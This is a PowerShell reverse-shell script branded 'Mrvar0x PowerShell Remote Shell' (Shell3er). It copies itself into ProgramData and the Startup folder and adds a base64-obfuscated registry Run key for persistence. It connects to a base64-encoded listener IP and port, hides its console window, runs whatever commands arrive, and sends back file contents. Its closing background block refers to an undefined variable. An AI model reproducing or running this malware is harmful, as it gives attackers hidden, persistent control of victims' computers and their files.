function Get-RandomProcessName {
    return "PS_" + [System.Guid]::NewGuid().ToString()
}

function Run-BackgroundTask {
    param(
        [ScriptBlock]$ScriptBlock,
        [string]$ProcessName
    )

    if (-not $ProcessName) {
        $ProcessName = Get-RandomProcessName
    }

    $JobName = "BackgroundTask_" + [Guid]::NewGuid().ToString()

    Start-Job -Name $JobName -ScriptBlock $ScriptBlock | Out-Null

    $job = Get-Job -Name $JobName

    while ($job.State -eq "Running") {
        Start-Sleep -Milliseconds 500
    }

    $result = $job | Receive-Job

    Remove-Job -Name $JobName -Force | Out-Null

    return $result
}


function download($filename) {
    try {
        $fileBytes = [System.IO.File]::ReadAllBytes($filename)
        $writer.Write("down:$filename`n")
        $writer.Write([Convert]::ToBase64String($fileBytes))
        $writer.Write("`n")
        $writer.Flush()
    } catch {
        $writer.Write("Err: " + $_.Exception.Message + "`n")
        $writer.Flush()
    }
}

function upload($filePath) {
    try {
        $content = [System.IO.File]::ReadAllBytes($filePath)
        $writer.Write("Upl:Success`n")
        $writer.Write([Convert]::ToBase64String($content))
        $writer.Write("`n")
        $writer.Flush()
    } catch {
        $writer.Write("Err: " + $_.Exception.Message + "`n")
        $writer.Flush()
    }
}

function Show-Banner {
@"

/ | _ __ | |_ () ___ _ __ ___
| | / _ | ' | || |/ _ | ' / |
| || () | | | | |_ | | () | | | _
__/|| ||_|/ |_/|| ||/
| __ __ _ _ __ || _ __ ___ _ __
| / |/ _` | '/ _ | | ' \ / _ \ '|
| |/| | (| | | | () | | |) | __/ |
|| ||_,|| _/|| ./ _||
|_|
Welcome to the Mrvar0x PowerShell Remote Shell!
"@
}

Copy-Item -Path $PSCommandPath -Destination "C:\ProgramData\$([System.IO.Path]::GetFileName($PSCommandPath))"

sp -Path $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SABLAEMAVQA6AFwAUwBPAEYAVABXAEEAUgBFAFwATQBpAGMAcgBvAHMAbwBmAHQAXABXAGkAbgBkAG8AdwBzAFwAQwB1AHIAcgBlAG4AdABWAGUAcgBzAGkAbwBuAFwAUgB1AG4A'))) -Name $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TQB5AFMAYwByAGkAcAB0AA=='))) -Value $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('cABvAHcAZQByAHMAaABlAGwAbAAuAGUAeABlACAALQBFAHgAZQBjAHUAdABpAG8AbgBQAG8AbABpAGMAeQAgAEIAeQBwAGEAcwBzACAALQBGAGkAbABlACAAQwA6AFwAUAByAG8AZwByAGEAbQBEAGEAdABhAFwAUwBoAGUAbABsADMAZQByAC4AcABzADEA')))

$sourcePath = "C:\ProgramData\Shell3er.ps1"
$destinationPath = [Environment]::GetFolderPath('Startup') + "\Shell3er.ps1"

Copy-Item -Path $sourcePath -Destination $destinationPath

Show-Banner

# Replace the IP and port with your own listener's IP and port (base64 encoded)
$encodedIp = 'MTkyLjE2OC4xODAuMTI4' # Replace with base64 encoded IP
$encodedPort = 'NDQ0NA==' # Replace with base64 encoded port
# Decode the IP address
$ip = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($encodedIp))
$port = [System.Convert]::ToInt32([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($encodedPort)))

# Create a TCP client
$client = New-Object System.Net.Sockets.TCPClient($ip, $port)
$stream = $client.GetStream()

# Create byte array for data
$buffer = New-Object Byte[] 1024

# Create StreamReader and StreamWriter
$reader = New-Object System.IO.StreamReader($stream)
$writer = New-Object System.IO.StreamWriter($stream)

# Redirect input, output, and error streams
$psI = [System.Console]::In
$psO = [System.Console]::Out
$psE = [System.Console]::Error
[System.Console]::SetIn($reader)
[System.Console]::SetOut($writer)
[System.Console]::SetError($writer)
# Hide the window
Add-Type -Name Window -Namespace Console -MemberDefinition '
[DllImport("Kernel32.dll")]
public static extern IntPtr GetConsoleWindow();

[DllImport("user32.dll")]
public static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);

public static void Hide()
{
    IntPtr console = GetConsoleWindow();
    if (console != IntPtr.Zero)
    {
        ShowWindow(console, 0);
    }
}'
[Console.Window]::Hide()

# Start PowerShell session
$shell = "PS " + (Get-Location).Path + "> "
$writer.Write($shell)
$writer.Flush()

# Command history
$history = @()

# Main loop
while ($true) {
  try {
    $data = $reader.ReadLine()
    $history += $data
    if ($data -eq "exit") { break }

    switch -Regex ($data) {

      'runscript (.+)' {
        $file = $matches[1]
        $scriptContent = [System.IO.File]::ReadAllText($file)
        $output = (Invoke-Expression -Command $scriptContent 2>&1 | Out-String)
      }

      'download (.+)' {
        $file = $matches[1]
        download $file
      }

      'upload (.+)' {
        $file = $matches[1]
        upload $file
      }

      'browse (.+)' {
        $directory = $matches[1]
        if (Test-Path $directory -PathType Container) {
          $output = Get-ChildItem $directory | Format-Table -AutoSize | Out-String
        } else {
          $output = "Directory not found"
        }
      }

      default {
        $output = (Invoke-Expression -Command $data 2>&1 | Out-String)
      }
    }
  } catch {
    $output = "Error: " + $_.Exception.Message
  }

  $writer.Write($output + $shell)
  $writer.Flush()
}

# Run in background
Run-BackgroundTask -ScriptBlock {

    # Create random process name for PowerShell process
    $processName = Get-RandomProcessName

    # Create process start info object
    $psi = New-Object System.Diagnostics.ProcessStartInfo
    $psi.FileName = "powershell.exe"
    $psi.Arguments = "-WindowStyle Hidden -NoLogo -NoProfile -EncodedCommand $encodedCommand"
    $psi.UseShellExecute = $false
    $psi.RedirectStandardOutput = $true
    $psi.RedirectStandardError = $true
    $psi.RedirectStandardInput = $true
    $psi.CreateNoWindow = $true
    $psi.UserName = $null
    $psi.Password = $null
    $psi.Domain = $null

    # Create PowerShell process object
    $p = New-Object System.Diagnostics.Process
    $p.StartInfo = $psi
    $p.EnableRaisingEvents = $true
    # Start PowerShell process
    $p.Start()
    # Wait for PowerShell process to exit
    $p.WaitForExit()
}